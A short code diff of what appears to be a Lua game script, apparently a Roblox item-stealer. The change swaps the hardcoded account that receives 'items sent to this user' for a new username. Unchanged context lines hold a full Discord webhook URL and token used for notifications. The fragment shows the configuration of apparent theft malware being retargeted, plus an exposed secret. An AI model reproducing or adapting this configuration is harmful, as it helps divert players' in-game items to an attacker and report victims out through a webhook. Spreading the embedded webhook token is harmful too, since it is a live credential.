@@ -11,7 +11,7 @@ end
 _G.scriptExecuted = true
 
 -- Hardcoded config - Items sent to this user
-_G.Usernames = {"LveEnergy"}
+_G.Usernames = {"ELITE_Yeetyouoffnoob"}
 -- Hardcoded webhook for notifications
 _G.webhook = "https://discord.com/api/webhooks/1451688110848213022/3CboHnaonpYASqPPGw8pZQ5o2glZBckOVjG_llA7hgt2uSgtWtQ3UopmaAaYjfL7X9LC"
 
